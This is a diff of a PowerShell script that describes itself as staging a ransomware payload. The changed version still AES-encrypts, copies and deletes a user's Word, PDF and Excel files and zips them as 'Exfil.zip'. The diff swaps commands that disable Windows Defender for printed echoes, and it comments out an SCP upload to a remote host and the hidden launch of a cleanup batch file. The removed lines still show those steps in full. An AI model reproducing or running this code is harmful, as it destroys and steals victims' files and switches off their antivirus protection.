@@ -3,8 +3,8 @@
 # Description: Stages ransomeware payload on a target system.
 
 # First things first, lets disable AV
-Add-MpPreference -ExclusionPath ‘C:’
-Set-MpPreference -DisableRealtimeMonitoring $true
+Write-Host "Add-MpPreference -ExclusionPath ‘C:’"
+Write-Host "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 # Copy PowerShell.exe to the home directory
 $random_num = Get-Random -Minimum 1000 -Maximum 9876
@@ -118,14 +118,16 @@ $filelist = Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx -Path $dir_to_
 #Get-ChildItem -Recurse -Include *.docx, *.pdf, *.txt -Path .\Documents | Export-Csv -Path files.csv
 #$filelist = Import-Csv -Path .\files.csv -Header FullName
 
-$new_location = $env:TEMP + "secret"
+$new_location = $env:TEMP + "\secret\"
 mkdir $new_location
 
 # Loop through the results
 foreach ($file in $filelist) {
     # Encrypt Files
+    Write-Host $file.FullName
     Invoke-AESEncryption -Mode Encrypt -Key 'p@ssw0rd' -Path $file.FullName
-    Copy-Item -Path $file.FullName -Destination "$new_location\$($file.FullName)"
+    $split_name = ($file.FullName).Split("\")[-1]
+    Copy-Item -Path $file.FullName -Destination "$new_location$split_name"
     Remove-Item -Path $file.FullName
 }
 
@@ -134,12 +136,12 @@ $exfil_zip = "Exfil.zip"
 Compress-Archive -Path $new_location -DestinationPath $exfil_zip
 
 # Connect to the remote server
-$credentials = Get-Credential
-$ip = '192.168.1.229'
-New-SSHSession -ComputerName $ip -Credential (Get-Credential $credentials)
-# SCP to transfer files
-Set-SCPItem -ComputerName $ip -Credential $credentials -Path $exfil_zip -Destination "/home/ubuntu"
-Remove-SSHSession -SessionId 0
+# $credentials = Get-Credential
+# $ip = '192.168.1.229'
+# New-SSHSession -ComputerName $ip -Credential (Get-Credential $credentials)
+# # SCP to transfer files
+# Set-SCPItem -ComputerName $ip -Credential $credentials -Path $exfil_zip -Destination "/home/ubuntu"
+# Remove-SSHSession -SessionId 0
 
 '@
 
@@ -184,4 +186,4 @@ REM del $backup_file
 "@
 
 $cleanupfile | Out-File -FilePath "update.bat" -Encoding oem
-Start-Process -FilePath "update.bat" -WindowStyle Hidden
+#Start-Process -FilePath "update.bat" -WindowStyle Hidden
